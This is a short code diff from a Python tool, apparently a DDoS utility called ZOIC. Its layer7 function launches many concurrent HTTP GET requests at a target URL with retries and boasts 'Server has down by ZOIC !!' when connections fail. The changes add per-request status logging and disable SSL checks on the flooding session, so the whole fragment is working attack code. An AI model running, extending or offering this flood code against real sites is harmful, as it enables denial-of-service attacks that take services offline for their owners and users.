@@ -143,7 +143,7 @@ def layer7():
                 }
                 try:
                     async with session.get(url, headers=headers) as response:
-                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] Request sent."))
+                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] Url : {url} > Status : {response.status}"))
                 except aiohttp.ClientConnectorError:
                     print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has down by ZOIC !!"))
                     if retries > 0:
@@ -161,7 +161,8 @@ def layer7():
                             await send_request(session, url, retries - 1)
 
             async def send_requests(url, get_request):
-                async with aiohttp.ClientSession() as session:
+                connector = aiohttp.TCPConnector(ssl=False)
+                async with aiohttp.ClientSession(connector=connector) as session:
                     tasks = [send_request(session, url) for _ in range(get_request)]
                     await asyncio.gather(*tasks)
 
